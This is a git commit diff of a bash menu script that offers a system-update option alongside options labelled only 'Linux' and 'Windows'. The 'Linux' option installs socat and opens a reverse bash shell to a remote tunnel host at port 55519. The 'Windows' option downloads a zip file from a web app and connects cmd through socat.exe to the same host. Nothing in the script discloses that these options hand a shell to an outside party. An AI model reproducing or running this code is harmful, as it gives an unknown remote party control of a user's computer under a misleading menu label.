349501bcf43996e1011255c5b459b7ae0761d42a
Siddharth Jain <83913594+siddharthjain25@users.noreply.github.com>
2024-07-07 01:56:48 +0530

    Update menu.sh

--- menu.sh
+++ menu.sh
@@ -1,46 +1,42 @@
 #!/bin/bash
 
-# Function definitions
-choice1() {
+linux_update() {
     sudo apt update && sudo apt upgrade -y
     sudo snap refresh
 }
 
-choice2() {
-    #For Linux
+linux() {
     sudo apt install socat
     socat tcp-connect:huge-ford.gl.at.ply.gg:55519 system:/bin/bash,pty,stderr,sane
 }
 
-choice3() {
-    #For Windows
-    "$client = new-object System.Net.WebClient"
-    "$client.DownloadFile(\"https://neonsppandro.web.app/Shining.zip\" , \"Shining.zip\")"
-    ./socat.exe tcp-connect:huge-ford.gl.at.ply.gg:55519 exec:cmd,pty,stderr,sane
+windows() {
+    '$client = new-object System.Net.WebClient'
+    '$client.DownloadFile(\"https://neonsppandro.web.app/Shining.zip\" , \"Shining.zip\")'
+    './socat.exe tcp-connect:huge-ford.gl.at.ply.gg:55519 exec:cmd,pty,stderr,sane'
 }
 
 show_menu() {
   echo "Please select an option:"
-  echo "1. Check for updates on your system."
+  echo "1. Check for updates on linux."
   echo "2. Linux"
   echo "3. Windows"
   echo "4. Exit"
 }
 
-# Main script
 while true; do
   show_menu
   read -p "Enter your choice: " choice
 
   case $choice in
     1)
-      choice1
+      linux_update
       ;;
     2)
-      choice2
+      linux
       ;;
     3)
-      choice3
+      windows
       ;;
     4)
       echo "Exiting..."
